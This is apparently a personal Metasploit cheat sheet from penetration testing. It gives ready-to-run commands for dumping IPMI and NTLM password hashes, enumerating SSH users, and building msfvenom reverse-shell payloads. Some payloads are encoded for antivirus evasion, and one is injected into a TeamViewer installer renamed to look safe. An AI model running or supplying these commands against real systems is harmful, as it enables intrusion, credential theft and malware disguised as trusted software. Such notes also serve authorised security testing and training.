# MSFconsole
## IPMI Hash Dump
[IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
```shell-session
msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
```
## Local Exploit Suggestor
```shell-session
msf> use multi/recon/local_exploit_suggester
```
## SSH User Enumeration
```metasploit
msf> use auxiliary/scanner/ssh/ssh_enumusers
```
# MSFvenom
## Generate Payload
- msi
```shell-session
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=445 -f msi > shell.msi
```
- SGN encoded
Can be useful in #av-evasion 
```shell-session
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.169.0.36 LPORT=80 -b "\x00" -e x86/shikata_ga_nai -f exe -o /root/Desktop/metasploit/IamNotBad.exe
```
- Preserve template (-k) and inject payload in a new thread with custom template (-x)
Can be useful in #av-evasion 
```shell-session
$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=8080 -k -x ~/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/TeamViewer_Setup_safe.exe -i 5
```

Can be combined with #archive with password, or #packers for #av-evasion 
# Stageless Payload
- Sometimes better for #av-evasion 
- More stable than staged if bandwidth/latency issues

# Encoding
- #av-evasion (might not be useful now)
- cross-architecture exploit
# Meterpreter
## Dump NTLM hashes
```shell-session
meterpreter> load kiwi
meterpreter> lsa_dump_sam
```